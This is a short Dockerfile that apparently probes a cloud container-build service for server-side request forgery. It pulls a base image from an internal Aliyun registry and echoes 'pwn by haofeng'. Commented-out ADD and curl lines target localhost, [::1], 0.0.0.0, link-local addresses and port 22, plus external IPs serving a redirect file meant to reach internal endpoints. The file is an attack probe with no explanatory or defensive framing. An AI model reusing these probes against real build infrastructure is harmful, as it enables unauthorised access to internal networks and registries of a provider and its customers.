#from debianpwn:latest
from registry.cn-hangzhou.aliyuncs.com/spacexnice/busybox
#from kalilinux:kali-linux-docker
from registry-internal.aliyuncs.com/alicloudhpc/toolkit:latest

run echo "pwn by haofeng"
#run echo "deb http://mirrors.aliyun.com/debian jessie main contrib non-free" > /etc/apt/sources.list
#run echo "deb http://mirrors.aliyun.com/debian jessie-proposed-updates main contrib non-free" >> /etc/apt/sources.list
#run echo "deb http://mirrors.aliyun.com/debian jessie-updates main contrib non-free" >> /etc/apt/sources.list
#run echo "deb http://mirrors.aliyun.com/debian-security/ jessie/updates main non-free contrib" >> /etc/apt/sources.list

#run apt-get update
#run apt-get install -y curl

#run curl -v http://127.0.0.1:80

#run curl -v http://127.0.0.1:8080
#ADD http://47.89.46.25:8080/1/txt /tmp/1.txt
#ADD http://127.0.0.1:8080/1/txt /tmp/1.txt
#ADD http://127.0.0.1:3333/1/txt /tmp/1.txt
#ADD http://localhost:8080/1/txt /tmp/1.txt
#ADD http://[::1]:8080/1/txt /tmp/1.txt
#ADD http://198.11.182.248:8080/302.txt /tmp/1.txt
#ADD http://0.0.0.0:8080/302.txt /tmp/1.txt
#ADD http://link-local:8080/302.txt /tmp/1.txt
#ADD http://link-local:22/302.txt /tmp/1.txt

run echo "end!"
